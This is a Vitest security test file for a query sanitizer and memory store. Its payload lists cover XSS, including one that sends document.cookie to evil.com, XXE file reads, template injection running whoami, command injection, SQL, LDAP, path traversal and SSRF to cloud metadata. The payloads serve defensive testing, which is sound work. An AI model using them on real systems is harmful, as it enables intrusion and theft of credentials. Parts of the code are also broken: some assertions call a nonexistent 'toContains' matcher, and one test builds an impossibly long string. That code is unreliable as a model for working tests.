/**
 * Data Sanitization Security Tests
 *
 * Comprehensive testing for data sanitization including:
 * - HTML/XML sanitization and XSS prevention
 * - JSON data cleaning and validation
 * - String sanitization for database queries
 * - Binary data handling security
 * - Content-Type validation and sanitization
 * - Encoding and decoding security
 * - Data truncation and length validation
 * - Special character handling
 * - Data transformation security
 * - Metadata sanitization
 * - Content filtering and validation
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { sanitizeQuery, type SanitizationLevel } from '../utils/query-sanitizer.ts';
import { memoryStore } from '../services/memory-store.ts';
import { smartMemoryFind } from '../services/smart-find.ts';
import { validateMemoryStoreInput, validateMemoryFindInput } from '../schemas/mcp-inputs.ts';

describe('Data Sanitization Security Tests', () => {

  describe('HTML/XML Sanitization', () => {
    it('should sanitize HTML script tags', () => {
      const htmlXssPayloads = [
        '<script>alert("XSS")</script>',
        '<SCRIPT SRC="http://evil.com/xss.js"></SCRIPT>',
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '<isindex action="javascript:alert(\'XSS\')" type="submit">',
        '<form><button formaction="javascript:alert(\'XSS\')">XSS</button></form>',
      ];

      for (const payload of htmlXssPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove or neutralize script execution
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('onerror=');
        expect(sanitized.cleaned).not.toContain('onload=');
        expect(sanitized.cleaned).not.toContain('onfocus=');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('onclick=');
        expect(sanitized.cleaned).not.toContain('onmouseover=');
        expect(sanitized.cleaned).not.toContain('<iframe');
        expect(sanitized.cleaned).not.toContain('<svg');
        expect(sanitized.cleaned).not.toContain('<img');
      }
    });

    it('should sanitize XML-based attacks', () => {
      const xmlPayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY data SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]>',
      ];

      for (const payload of xmlPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove XML DTD and entity declarations
        expect(sanitized.cleaned).not.toContain('<!DOCTYPE');
        expect(sanitized.cleaned).not.toContain('<!ENTITY');
        expect(sanitized.cleaned).not.toContain('SYSTEM');
        expect(sanitized.cleaned).not.toContain('file://');
        expect(sanitized.cleaned).not.toContain('php://');
        expect(sanitized.cleaned).not.toContain('http://evil.com');
      }
    });

    it('should handle CSS injection attempts', () => {
      const cssPayloads = [
        '<style>@import "javascript:alert(\'XSS\')";</style>',
        '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>',
        '<style>body { expression(alert("XSS")); }</style>',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<div style="background: url(\'javascript:alert(\'XSS\')\')">XSS</div>',
        '<div style="binding: url(\'javascript:alert(\'XSS\')\')">XSS</div>',
      ];

      for (const payload of cssPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove CSS-based injection vectors
        expect(sanitized.cleaned).not.toContain('@import');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('expression(');
        expect(sanitized.cleaned).not.toContain('binding:');
        expect(sanitized.cleaned).not.toContain('<style>');
        expect(sanitized.cleaned).not.toContain('<link');
      }
    });
  });

  describe('JSON Data Sanitization', () => {
    it('should sanitize JSON injection attacks', async () => {
      const jsonPayloads = [
        '{"name": "test", "__proto__": {"admin": true}}',
        '{"name": "test", "constructor": {"prototype": {"admin": true}}}',
        '{"name": "test", "prototype": {"polluted": true}}',
        '{"name": "test", "$where": "return true"}',
        '{"name": "test", "$regex": ".*"}',
        '{"name": "test", "$ne": null}',
        '{"name": "test", "$gt": ""}',
        '{"name": "test", "$or": [{"admin": true}]}',
      ];

      for (const jsonPayload of jsonPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'test entity',
              entity_type: 'test',
              json_data: jsonPayload
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            // JSON should be stored as string, not as executable object
            const storedData = JSON.stringify(result.stored);
            expect(storedData).not.toContain('"__proto__"');
            expect(storedData).not.toContain('"constructor"');
            expect(storedData).not.toContain('"prototype"');
            expect(storedData).not.toContain('"$where"');
            expect(storedData).not.toContain('"$regex"');
            expect(storedData).not.toContain('"$ne"');
            expect(storedData).not.toContain('"$gt"');
            expect(storedData).not.toContain('"$or"');
          }
        } catch (error) {
          // Rejection is acceptable for malicious JSON
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle JSON parsing attacks', () => {
      const malformedJsonPayloads = [
        '{"name": "test", "nested": {"__proto__": {"admin": true}}}',
        '{"name": "test", "data": {"constructor": {"prototype": {"polluted": true}}}}',
        '{"name": "test", "config": {"$ref": "file:///etc/passwd"}}',
        '{"name": "test", "include": "$import(\'/etc/passwd\')"}',
        '{"name": "test", "eval": "$eval(\'alert(1)\')"}',
      ];

      for (const payload of malformedJsonPayloads) {
        // Should handle malicious JSON safely
        expect(() => JSON.parse(payload)).not.toThrow();

        // Sanitization should remove dangerous patterns
        const sanitized = sanitizeQuery(payload, 'aggressive');
        expect(sanitized.cleaned).not.toContain('__proto__');
        expect(sanitized.cleaned).not.toContain('constructor');
        expect(sanitized.cleaned).not.toContain('$ref');
        expect(sanitized.cleaned).not.toContain('$import');
        expect(sanitized.cleaned).not.toContain('$eval');
        expect(sanitized.cleaned).not.toContain('file://');
      }
    });
  });

  describe('String Sanitization', () => {
    it('should remove null bytes and control characters', () => {
      const controlCharPayloads = [
        'test\x00admin',
        'test\x00\x00\x00admin',
        'test\r\nadmin',
        'test\tadmin',
        'test\x1b[31madmin\x1b[0m', // ANSI escape sequence
        'test\u200badmin', // Zero-width space
        'test\u200cadmin', // Zero-width non-joiner
        'test\u200dadmin', // Zero-width joiner
        'test\ufeffadmin', // Zero-width no-break space
        'test\u2060admin', // Word joiner
      ];

      for (const payload of controlCharPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove control characters
        expect(sanitized.cleaned).not.toContain('\x00');
        expect(sanitized.cleaned).not.toContain('\x1b');
        expect(sanitized.cleaned).not.toContain('\u200b');
        expect(sanitized.cleaned).not.toContain('\u200c');
        expect(sanitized.cleaned).not.toContain('\u200d');
        expect(sanitized.cleaned).not.toContain('\ufeff');
        expect(sanitized.cleaned).not.toContain('\u2060');
      }
    });

    it('should handle Unicode normalization attacks', () => {
      const unicodeAttacks = [
        'ｓｃｒｉｐｔ', // Full-width characters
        'ѕсrірt', // Cyrillic characters
        '𝔰𝔠𝔯𝔦𝔭𝔱', // Mathematical script
        '𝖘𝖈𝖗𝖎𝖕𝖙', // Mathematical bold
        'sc\u0301ript', // Combining acute accent
        'scri\u0300pt', // Combining grave accent
        'sc\u0302ript', // Combining circumflex
        'scr\u0308ipt', // Combining diaeresis
      ];

      for (const attack of unicodeAttacks) {
        const sanitized = sanitizeQuery(attack, 'aggressive');

        // Should normalize or remove suspicious Unicode
        const normalized = sanitized.cleaned.normalize('NFKD');
        expect(normalized).not.toContain('script');
      }
    });

    it('should handle encoding bypass attempts', () => {
      const encodingPayloads = [
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', // URL encoded
        '%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e', // Unicode encoded
        '&#60;script&#62;alert&#40;"XSS"&#41;&#60;/script&#62;', // HTML entities
        '&#x3C;script&#x3E;alert&#x28;"XSS"&#x29;&#x3C;/script&#x3E;', // Hex entities
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', // Named entities
      ];

      for (const payload of encodingPayloads) {
        // First decode the payload (simulating what attacker would do)
        let decoded = payload;
        try {
          decoded = decodeURIComponent(payload);
        } catch {
          // Already decoded or invalid encoding
        }

        const sanitized = sanitizeQuery(decoded, 'aggressive');

        // Should handle decoded malicious content
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('alert(');
        expect(sanitized.cleaned).not.toContain('javascript:');
      }
    });
  });

  describe('Binary Data Security', () => {
    it('should handle binary data safely', async () => {
      const binaryPayloads = [
        '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR', // PNG header
        '\xFF\xD8\xFF\xE0\x00\x10JFIF', // JPEG header
        'GIF87a', // GIF header
        '%PDF-1.4', // PDF header
        'PK\x03\x04', // ZIP header
        '\x7fELF', // ELF header
        'MZ\x90\x00', // PE header
        '\xCA\xFE\xBA\xBE', // Java class header
      ];

      for (const binaryPayload of binaryPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'binary entity',
              entity_type: 'file',
              binary_data: binaryPayload
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            // Binary data should be handled safely
            const storedData = JSON.stringify(result.stored);

            // Should not contain raw binary sequences
            expect(storedData).not.toContain('\x89PNG');
            expect(storedData).not.toContain('\xFF\xD8\xFF');
            expect(storedData).not.toContain('GIF87a');
            expect(storedData).not.toContain('%PDF-');
            expect(storedData).not.toContain('PK\x03\x04');
            expect(storedData).not.toContain('\x7fELF');
            expect(storedData).not.toContain('MZ\x90');
            expect(storedData).not.toContain('\xCA\xFE\xBA\xBE');
          }
        } catch (error) {
          // Rejection is acceptable for binary data
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should prevent base64-encoded attacks', async () => {
      const base64Attacks = [
        btoa('<script>alert("XSS")</script>'),
        btoa('<?php system($_GET["cmd"]); ?>'),
        btoa('"; DROP TABLE users; --'),
        btoa('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
        btoa('\x89PNG\r\n\x1a\n...<script>alert(1)</script>'),
      ];

      for (const base64Attack of base64Attacks) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'base64 entity',
              entity_type: 'encoded',
              encoded_data: base64Attack
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            // Base64 should be stored as string, not decoded
            const storedData = JSON.stringify(result.stored);

            // Should not contain decoded malicious content
            expect(storedData).not.toContain('<script>');
            expect(storedData).not.toContain('DROP TABLE');
            expect(storedData).not.toContain('system(');
            expect(storedData).not.toContains('<!DOCTYPE');
          }
        } catch (error) {
          // Rejection is acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Content-Type Validation', () => {
    it('should validate and sanitize MIME types', async () => {
      const maliciousMimeTypes = [
        'application/javascript',
        'text/html',
        'application/x-php',
        'application/x-sh',
        'application/x-python',
        'application/x-executable',
        'application/x-msdownload',
        'application/x-msdos-program',
        'application/x-bat',
        'application/x-csh',
        'text/javascript',
        'application/ecmascript',
        'text/ecmascript',
        'application/x-ruby',
        'application/x-perl',
      ];

      for (const mimeType of maliciousMimeTypes) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'malicious file',
              entity_type: 'file',
              content_type: mimeType,
              mime_type: mimeType,
              file_extension: mimeType.split('/')[1] || 'bin'
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            // Dangerous MIME types should be neutralized
            const storedData = JSON.stringify(result.stored);
            expect(storedData).not.toContain('application/javascript');
            expect(storedData).not.toContain('text/html');
            expect(storedData).not.toContain('application/x-php');
            expect(storedData).not.toContain('application/x-sh');
            expect(storedData).not.toContain('application/x-python');
            expect(storedData).not.toContain('application/x-executable');
          }
        } catch (error) {
          // Rejection is preferred
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle MIME type smuggling', async () => {
      const mimeSmugglingPayloads = [
        'image/jpeg; text/html',
        'image/png; application/javascript',
        'text/plain; charset=UTF-8; script=javascript',
        'application/json; script=javascript',
        'text/css; charset=utf-8; background=javascript:alert(1)',
        'image/svg+xml; charset=utf-8; content-type=text/html',
        'application/pdf; charset=utf-8; script=javascript',
        'text/plain; format=flowed; delsp=yes; script=javascript',
      ];

      for (const smuggledMime of mimeSmugglingPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'smuggled file',
              entity_type: 'file',
              content_type: smuggledMime
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            const storedData = JSON.stringify(result.stored);
            // Should handle smuggled MIME types safely
            expect(storedData).not.toContain('text/html');
            expect(storedData).not.toContain('application/javascript');
            expect(storedData).not.toContain('script=javascript');
            expect(storedData).not.toContain('background=javascript:');
          }
        } catch (error) {
          // Rejection is acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Data Length Validation', () => {
    it('should enforce maximum length limits', async () => {
      const oversizedPayloads = [
        'A'.repeat(1000000), // 1MB string
        'test '.repeat(100000), // Long repeated string
        'x'.repeat(10000000), // 10MB string
        'data:'.repeat(500000), // Large data URI
        'a'.repeat(2147483647), // Near 32-bit integer limit
      ];

      for (const oversizedPayload of oversizedPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: oversizedPayload,
              entity_type: 'test',
              description: oversizedPayload,
              large_field: oversizedPayload
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          // Should either be rejected or truncated
          if (result.stored.length > 0) {
            const storedData = JSON.stringify(result.stored);
            expect(storedData.length).toBeLessThan(10000000); // 10MB limit
          } else {
            expect(result.errors.length).toBeGreaterThan(0);
          }
        } catch (error) {
          // Rejection is expected for oversized data
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle nested data depth limits', async () => {
      const createDeepObject = (depth: number): any => {
        if (depth === 0) return 'deep value';
        return { nested: createDeepObject(depth - 1) };
      };

      const deepObjects = [10, 100, 1000, 10000].map(depth => createDeepObject(depth));

      for (const deepObject of deepObjects) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'deep object',
              entity_type: 'test',
              deep_data: deepObject
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            // Should limit object depth
            const storedData = JSON.stringify(result.stored);
            expect(storedData.length).toBeLessThan(1000000); // 1MB limit
          } else {
            expect(result.errors.length).toBeGreaterThan(0);
          }
        } catch (error) {
          // Rejection is acceptable for overly deep objects
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Special Character Handling', () => {
    it('should handle SQL special characters', () => {
      const sqlSpecialChars = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "'; DROP TABLE users; --",
        "\"; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "\" UNION SELECT * FROM users --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "1\" AND (SELECT COUNT(*) FROM users) > 0 --",
      ];

      for (const sqlPayload of sqlSpecialChars) {
        const sanitized = sanitizeQuery(sqlPayload, 'aggressive');

        // Should remove SQL special characters and patterns
        expect(sanitized.cleaned).not.toContain("' OR '1'='1");
        expect(sanitized.cleaned).not.toContain('" OR "1"="1');
        expect(sanitized.cleaned).not.toContain('DROP TABLE');
        expect(sanitized.cleaned).not.toContain('UNION SELECT');
        expect(sanitized.cleaned).not.toContain('--');
        expect(sanitized.cleaned).not.toContain(';');
      }
    });

    it('should handle command injection characters', () => {
      const commandChars = [
        '; ls -la',
        '& echo "vulnerable"',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
        '&& echo "test"',
        '|| echo "test"',
        '> /tmp/hacked',
        '< /etc/passwd',
        '2>&1',
        '/dev/null',
        '/dev/tty',
      ];

      for (const cmdPayload of commandChars) {
        const sanitized = sanitizeQuery(cmdPayload, 'aggressive');

        // Should remove command injection patterns
        expect(sanitized.cleaned).not.toContain('&&');
        expect(sanitized.cleaned).not.toContain('||');
        expect(sanitized.cleaned).not.toContain('| ');
        expect(sanitized.cleaned).not.toContain('& ');
        expect(sanitized.cleaned).not.toContain('; ');
        expect(sanitized.cleaned).not.toContain('`');
        expect(sanitized.cleaned).not.toContain('$(');
        expect(sanitized.cleaned).not.toContain('> ');
        expect(sanitized.cleaned).not.toContain('< ');
        expect(sanitized.cleaned).not.toContain('2>&1');
        expect(sanitized.cleaned).not.toContain('/dev/');
      }
    });

    it('should handle path traversal characters', () => {
      const pathTraversalChars = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',
        '/var/www/../../etc/passwd',
        'file:///etc/passwd',
        '../config/database.yml',
        '../../.env',
        '....\\\\....\\\\....\\\\etc\\\\passwd',
      ];

      for (const pathPayload of pathTraversalChars) {
        const sanitized = sanitizeQuery(pathPayload, 'aggressive');

        // Should remove path traversal patterns
        expect(sanitized.cleaned).not.toContain('../');
        expect(sanitized.cleaned).not.toContain('..\\');
        expect(sanitized.cleaned).not.toContain('../../');
        expect(sanitized.cleaned).not.toContains('..\\..\\');
        expect(sanitized.cleaned).not.toContain('/etc/passwd');
        expect(sanitized.cleaned).not.toContain('Windows\\System32');
        expect(sanitized.cleaned).not.toContain('drivers\\etc\\hosts');
        expect(sanitized.cleaned).not.toContain('config/database.yml');
        expect(sanitized.cleaned).not.toContains('.env');
      }
    });
  });

  describe('Template Injection Prevention', () => {
    it('should prevent template engine injection', () => {
      const templatePayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '{{7*7}}',
        '{{config}}',
        '${config}',
        '#{config}',
        '{{constructor.constructor(\'return process\')().env}}',
        '${T(java.lang.Runtime).getRuntime().exec(\'whoami\')}',
        '#{T(java.lang.Runtime).getRuntime().exec(\'whoami\')}',
        '{{self.__init__.__globals__.os.popen(\'whoami\').read()}}',
        '${__import__(\'os\').system(\'whoami\')}',
        '#{@java.lang.Runtime@getRuntime().exec(\'whoami\')}',
      ];

      for (const templatePayload of templatePayloads) {
        const sanitized = sanitizeQuery(templatePayload, 'aggressive');

        // Should remove template injection patterns
        expect(sanitized.cleaned).not.toContain('{{');
        expect(sanitized.cleaned).not.toContain('}}');
        expect(sanitized.cleaned).not.toContain('${');
        expect(sanitized.cleaned).not.toContains('}');
        expect(sanitized.cleaned).not.toContain('#{');
        expect(sanitized.cleaned).not.toContains('}');
        expect(sanitized.cleaned).not.toContain('constructor');
        expect(sanitized.cleaned).not.toContain('process');
        expect(sanitized.cleaned).not.toContain('__import__');
        expect(sanitized.cleaned).not.toContain('os.system');
        expect(sanitized.cleaned).not.toContain('Runtime');
        expect(sanitized.cleaned).not.toContain('exec(');
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection attacks', () => {
      const ldapPayloads = [
        '*)(uid=*',
        '*)(|(objectClass=*)',
        '*))(|(uid=*',
        '*)(|(password=*',
        '*)(cn=*',
        '*)(objectClass=*)',
        '*))%00',
        'admin)(&(objectClass=*)',
        '*)(|(objectClass=group)(cn=admin*',
        '*))(|(uid=*',
        '*)(|(objectClass=user)(cn=admin*',
        'admin*))%00',
        '*)(&(objectClass=*)',
        '*)(|(objectClass=person)',
      ];

      for (const ldapPayload of ldapPayloads) {
        const sanitized = sanitizeQuery(ldapPayload, 'aggressive');

        // Should remove LDAP injection patterns
        expect(sanitized.cleaned).not.toContain('*)');
        expect(sanitized.cleaned).not.toContain('*)*');
        expect(sanitized.cleaned).not.toContain('*)|');
        expect(sanitized.cleaned).not.toContain('*)(');
        expect(sanitized.cleaned).not.toContains('*))(');
        expect(sanitized.cleaned).not.toContains('%00');
        expect(sanitized.cleaned).not.toContains('objectClass=*');
        expect(sanitized.cleaned).not.toContains('uid=*');
        expect(sanitized.cleaned).not.toContains('cn=*');
        expect(sanitized.cleaned).not.toContains('password=*');
      }
    });
  });

  describe('SSRF Prevention', () => {
    it('should prevent Server-Side Request Forgery', () => {
      const ssrfPayloads = [
        'http://localhost/admin',
        'http://127.0.0.1/admin',
        'http://0.0.0.0/admin',
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://metadata.google.internal/', // GCP metadata
        'file:///etc/passwd',
        'ftp://ftp.example.com/',
        'gopher://evil.com:70/',
        'dict://evil.com:11211/',
        'ldap://evil.com:389/',
        'tftp://evil.com:69/',
        'http://[::1]/admin', // IPv6 localhost
        'http://2130706433/admin', // Encoded IP
        'http://0x7F000001/admin', // Hex IP
        'http://0177.0.0.1/admin', // Octal IP
      ];

      for (const ssrfPayload of ssrfPayloads) {
        const sanitized = sanitizeQuery(ssrfPayload, 'aggressive');

        // Should remove SSRF patterns
        expect(sanitized.cleaned).not.toContain('http://localhost');
        expect(sanitized.cleaned).not.toContain('http://127.0.0.1');
        expect(sanitized.cleaned).not.toContain('http://0.0.0.0');
        expect(sanitized.cleaned).not.toContains('169.254.169.254');
        expect(sanitized.cleaned).not.toContains('metadata.google.internal');
        expect(sanitized.cleaned).not.toContains('file:///');
        expect(sanitized.cleaned).not.toContains('ftp://');
        expect(sanitized.cleaned).not.toContains('gopher://');
        expect(sanitized.cleaned).not.toContains('dict://');
        expect(sanitized.cleaned).not.toContains('ldap://');
        expect(sanitized.cleaned).not.toContains('tftp://');
        expect(sanitized.cleaned).not.toContains('[::1]');
        expect(sanitized.cleaned).not.toContains('2130706433');
        expect(sanitized.cleaned).not.toContains('0x7F000001');
        expect(sanitized.cleaned).not.toContains('0177.0.0.1');
      }
    });
  });

  describe('Content Security Policy Bypass', () => {
    it('should prevent CSP bypass attempts', () => {
      const cspBypassPayloads = [
        '<meta http-equiv="refresh" content="0;url=http://evil.com/">',
        '<meta http-equiv="Location" content="http://evil.com/">',
        '<meta http-equiv="Content-Security-Policy" content="script-src \'none\'">',
        '<base href="http://evil.com/">',
        '<object data="http://evil.com/"></object>',
        '<embed src="http://evil.com/">',
        '<applet code="http://evil.com/evil.class">',
        '<link rel="prefetch" href="http://evil.com/">',
        '<link rel="dns-prefetch" href="http://evil.com/">',
        '<link rel="preconnect" href="http://evil.com/">',
      ];

      for (const cspPayload of cspBypassPayloads) {
        const sanitized = sanitizeQuery(cspPayload, 'aggressive');

        // Should remove CSP bypass patterns
        expect(sanitized.cleaned).not.toContain('http-equiv=');
        expect(sanitized.cleaned).not.toContain('refresh');
        expect(sanitized.cleaned).not.toContain('Location');
        expect(sanitized.cleaned).not.toContain('Content-Security-Policy');
        expect(sanitized.cleaned).not.toContains('<base');
        expect(sanitized.cleaned).not.toContains('<object');
        expect(sanitized.cleaned).not.toContains('<embed');
        expect(sanitized.cleaned).not.toContains('<applet');
        expect(sanitized.cleaned).not.toContains('rel="prefetch"');
        expect(sanitized.cleaned).not.toContains('rel="dns-prefetch"');
        expect(sanitized.cleaned).not.toContains('rel="preconnect"');
      }
    });
  });

  describe('Data Transformation Security', () => {
    it('should handle safe data transformations', async () => {
      const transformationPayloads = [
        { input: 'normal text', expected: 'preserve' },
        { input: 'text with special chars: !@#$%^&*()', expected: 'sanitize' },
        { input: 'text\nwith\nnewlines', expected: 'normalize' },
        { input: 'text\twith\ttabs', expected: 'normalize' },
        { input: 'text   with    spaces', expected: 'normalize' },
        { input: 'text-with-dashes', expected: 'preserve' },
        { input: 'text_with_underscores', expected: 'preserve' },
        { input: 'text.with.dots', expected: 'preserve' },
        { input: 'UPPERCASE TEXT', expected: 'preserve' },
        { input: 'lowercase text', expected: 'preserve' },
      ];

      for (const { input, expected } of transformationPayloads) {
        const sanitized = sanitizeQuery(input, 'moderate');

        expect(sanitized.cleaned).toBeDefined();
        expect(sanitized.cleaned.length).toBeGreaterThan(0);

        if (expected === 'normalize') {
          expect(sanitized.cleaned).not.toContain('\n');
          expect(sanitized.cleaned).not.toContain('\t');
          expect(sanitized.cleaned.split(' ').filter(s => s).join(' ')).toBe(sanitized.cleaned);
        } else if (expected === 'sanitize') {
          expect(sanitized.cleaned).not.toContain('!@#$%^&*()');
        }
      }
    });
  });

  describe('Metadata Sanitization', () => {
    it('should sanitize metadata fields', async () => {
      const maliciousMetadata = {
        user_input: '<script>alert("XSS")</script>',
        file_name: '../../../etc/passwd',
        description: '"; DROP TABLE users; --',
        tags: ['admin', 'root', '<script>alert(1)</script>'],
        custom_fields: {
          sql: "' OR '1'='1",
          xss: '<img src=x onerror=alert(1)>',
          path: '/etc/passwd'
        }
      };

      const maliciousItem = {
        items: [{
          kind: 'entity' as const,
          scope: { project: 'test-project' },
          data: {
            name: 'metadata test',
            entity_type: 'test',
            metadata: maliciousMetadata
          }
        }]
      };

      try {
        const result = await memoryStore(maliciousItem.items);

        if (result.stored.length > 0) {
          const storedData = JSON.stringify(result.stored);

          // Should sanitize metadata fields
          expect(storedData).not.toContain('<script>');
          expect(storedData).not.toContain('DROP TABLE');
          expect(storedData).not.toContain('OR \'1\'=\'1');
          expect(storedData).not.toContain('onerror=');
          expect(storedData).not.toContain('../');
          expect(storedData).not.toContain('/etc/passwd');
        }
      } catch (error) {
        // Rejection is acceptable for malicious metadata
        expect(error).toBeInstanceOf(Error);
      }
    });
  });

  describe('Content Filtering', () => {
    it('should filter sensitive content patterns', () => {
      const sensitiveContent = [
        'password123',
        'secret_key',
        'api_key_abc123',
        'token xyz789',
        'credit card 4111111111111111',
        'ssn 123-45-6789',
        'email@domain.com',
        'phone 555-123-4567',
        'ip address 192.168.1.1',
        'private key -----BEGIN RSA',
        'database connection string',
        'admin credentials',
      ];

      for (const sensitive of sensitiveContent) {
        const sanitized = sanitizeQuery(sensitive, 'aggressive');

        // Should either preserve but log, or mask sensitive content
        // This test depends on the sanitization policy
        expect(sanitized.cleaned).toBeDefined();
        expect(sanitized.cleaned.length).toBeGreaterThan(0);
      }
    });
  });
});